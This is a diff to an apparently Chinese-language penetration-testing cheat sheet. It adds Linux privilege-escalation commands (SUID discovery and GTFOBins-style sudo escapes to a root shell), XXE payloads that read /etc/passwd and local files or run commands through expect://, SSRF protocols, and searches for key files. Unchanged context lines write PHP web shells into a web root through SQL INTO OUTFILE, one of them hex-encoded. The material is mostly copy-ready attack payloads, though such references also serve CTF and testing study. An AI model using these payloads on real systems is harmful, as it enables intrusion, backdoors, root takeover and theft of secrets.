@@ -453,7 +453,7 @@ SELECT group_concat(column_name) FROM information_schema.columns WHERE table_nam
 SELECT group_concat(concat('<列名1>',':','<列名2>')) FROM '<表名>'; # 获取数据
 
 # 写文件
-SELECT "<?php system($_GET['cmd']); ?>" into OUTFILE "C:\\xampp\\htdocs\\backdoor.php";
+SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE "C:\\xampp\\htdocs\\backdoor.php";
 SELECT 0x3c3f7068702073797374656d28245f4745545b2763275d293b203f3e INTO DUMPFILE '/var/www/html/images/shell.php';
 
 # 读文件
@@ -800,3 +800,148 @@ net user Administrator qW1@
 
 - 连接RDP即可
 
+
+### Linux
+
+- SUID程序
+
+```shell
+find / -perm -u=s -type f 2>/dev/null
+```
+
+- sudo特权程序 参考GTFOBins 如
+
+```shell
+sudo less <SOME_FILE>
+!/bin/sh
+
+sudo apt changelog apt
+!/bin/sh
+
+sudo arp -v -f /root/root.txt
+sudo comm /root/root.txt /dev/null 2>/dev/null
+sudo curl file:///root/root.txt
+
+sudo git help config
+!/bin/sh
+
+sudo TERM= more /etc/profile
+!/bin/sh
+
+sudo awk 'BEGIN {system("/bin/sh")}'
+
+sudo find . -exec /bin/sh \; -quit
+
+sudo mysql -e '\! /bin/sh'
+
+sudo node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
+
+sudo php -r "system('/bin/sh');"
+
+sudo python -c 'import os; os.system("/bin/sh")'
+
+sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
+
+sudo service ../../bin/sh
+```
+
+## XXE
+
+### 外部实体
+
+使用 `ENTITY` 关键字定义实体
+```xml
+<!ENTITY entity_name "entity_value">
+<!ENTITY example "Doe">
+```
+使用 `SYSTEM` 关键字可以使攻击者能够从远程服务器获取内容
+```xml
+<!ENTITY entity_name SYSTEM 'url'>
+```
+`PUBLIC` 和它几乎是同义词，区别在于多一个任意字符
+```xml
+<!ENTITY entity_name PUBLIC "any_text" "url">
+```
+实体必须在 `DOCTYPE` 中定义
+引用时使用 `&<ENTITY_NAME>;`
+```xml
+<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>
+```
+
+```xml
+<!DOCTYPE foo[
+    <!ELEMENT foo ANY >
+	<!ENTITY file SYSTEM "file:///etc/passwd">
+]>
+<foo>&file;</foo>
+```
+
+- file协议 以读取windows文件为例
+
+```xml
+<!DOCTYPE foo [<!ENTITY bar SYSTEM "file:///c:/Users/CISP/Desktop/temp/gen.py">]><foo>&bar;</foo>
+```
+
+```xml
+<!DOCTYPE foo [<!ENTITY bar PUBLIC "abc" "file:///c:/Users/CISP/Desktop/temp/gen.py">]><foo>&bar;</foo>
+```
+
+- data协议 Base64编码
+
+```xml
+<!DOCTYPE foo [<!ENTITY bar SYSTEM "data://text/plain;base64,YWJjZGVm">]><foo>&bar;</foo>
+```
+
+- php协议
+
+```xml
+<!DOCTYPE foo [<!ENTITY bar SYSTEM "php://filter/convert.base64-encode/resource=xxe.php">]><foo>&bar;</foo>
+```
+
+- XInclude
+
+```xml
+<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+  <xi:include parse="text" href="file:///etc/passwd"/>
+</foo>
+```
+
+- SSRF常用的协议都可以试试
+
+```
+dict://
+gopher://
+```
+
+- 特殊语法
+
+```xml
+<!DOCTYPE root [
+    <!ENTITY % aaa SYSTEM "data://text/plain,abdef">
+    %aaa;
+]>
+<root></root>
+```
+
+- expect协议执行命令
+
+```xml
+<!DOCTYPE foo [<!ENTITY bar SYSTEM "expect://ls$IFS-la">]><foo>&bar;</foo>
+```
+
+## 暴力检索
+
+```shell
+grep -r "key:" <ROOT_PATH>
+
+find <ROOT_PATH> -name "*key*" -type f
+```
+
+```cmd
+dir /s /b *key*
+
+findstr /s /i /c:"key" *
+
+# 默认当前目录 需要指定目录的话
+# cd <ROOT_PATH> & <CMD>
+```
